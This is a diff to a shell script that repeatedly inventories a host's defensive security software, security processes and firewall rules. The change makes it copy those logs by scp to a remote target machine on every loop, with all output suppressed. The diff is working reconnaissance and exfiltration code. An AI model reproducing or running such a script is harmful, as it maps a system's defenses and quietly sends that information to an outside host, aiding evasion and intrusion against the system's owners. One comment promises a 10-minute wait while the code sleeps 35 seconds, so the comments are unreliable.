@@ -26,6 +26,9 @@ TARGET_DIR="/path/to/target/directory" # Replace with the directory on the targe
 # Setup the logging directory
 mkdir -p "$LOG_DIR"
 
+# Establish ssh connection with target machine
+ssh "$TARGET_USER@$TARGET_IP" "mkdir -p '$TARGET_DIR'"
+
 # Function to log installed software matching defensive tools list
 log_installed_software() {
     # Clear the log file if it exists
@@ -84,11 +87,8 @@ while true; do
     log_defensive_processes
     log_firewalld_rules
     log_iptables_rules
+    scp "$SOFTWARE_LOG" "$PROCESS_LOG" "$FIREWALL_LOG" "$TARGET_USER@$TARGET_IP:$TARGET_DIR" > /dev/null 2>&1
     echo ""
     echo "~~Finished main loop, waiting for cooldown!!"
     sleep 35  # Wait for 10 minutes before the next check
 done
-
-# Create target directory on remote machine if it doesn’t exist, then send logs
-ssh "$TARGET_USER@$TARGET_IP" "mkdir -p '$TARGET_DIR'"
-scp "$SOFTWARE_LOG" "$PROCESS_LOG" "$FIREWALL_LOG" "$TARGET_USER@$TARGET_IP:$TARGET_DIR" > /dev/null 2>&1
